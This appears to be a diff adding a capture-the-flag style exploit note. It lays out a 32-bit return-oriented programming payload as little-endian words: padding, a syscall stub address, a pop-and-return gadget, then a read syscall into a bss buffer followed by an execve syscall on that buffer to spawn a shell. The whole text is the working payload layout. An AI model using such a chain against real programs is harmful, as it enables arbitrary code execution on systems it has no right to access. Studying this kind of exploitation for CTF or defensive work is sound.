@@ -1,0 +1,24 @@
+61616161
+62616161
+63616161
+64616161
+
+20830408 _syscall
+78850408 ret-->pop ebx, pop esi, pop edi, pop ebp ,ret
+03000000
+00000000
+20a00408
+08000000
+call _syscall(3,0,bss_addr,8)
+
+20830408
+efbeadde  任意值
+0b000000
+20a00408
+00000000
+00000000
+call _syscall(b,bss_addr,0,0)
+
+
+
+
